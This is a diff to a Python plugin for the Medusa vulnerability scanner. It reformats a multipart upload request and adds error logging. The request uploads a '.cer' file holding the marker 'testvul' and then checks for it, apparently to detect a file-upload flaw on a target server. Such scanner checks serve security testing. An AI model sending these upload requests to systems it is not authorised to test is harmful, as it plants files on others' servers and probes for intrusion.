@@ -46,15 +46,15 @@ def medusa(Url,RandomAgent,UnixTimestamp):
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
         shell= scheme + "://" + url + ":" + str(port) + "9d37b73795649038.cer"
         data = '''
-            ------WebKitFormBoundarySi7aFG5fhvI14Vbv
-            Content-Disposition: form-data; name="__VIEWSTATE"
-            /wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
-            ------WebKitFormBoundarySi7aFG5fhvI14Vbv
-            Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
-            Content-Type: application/x-x509-ca-cert
-            testvul
-            ------WebKitFormBoundarySi7aFG5fhvI14Vbv--
-            '''
+------WebKitFormBoundarySi7aFG5fhvI14Vbv
+Content-Disposition: form-data; name="__VIEWSTATE"
+/wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
+------WebKitFormBoundarySi7aFG5fhvI14Vbv
+Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
+Content-Type: application/x-x509-ca-cert
+testvul
+------WebKitFormBoundarySi7aFG5fhvI14Vbv--
+'''
         headers = {
             'User-Agent': RandomAgent,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -71,6 +71,7 @@ def medusa(Url,RandomAgent,UnixTimestamp):
             _t=VulnerabilityInfo(Medusa)
             ClassCongregation.VulnerabilityDetails(_t.info, url,UnixTimestamp).Write()  # 传入url和扫描到的数据
             ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
-    except Exception:
+    except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
+        ClassCongregation.ErrorHandling().Outlier(e, _)
         _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
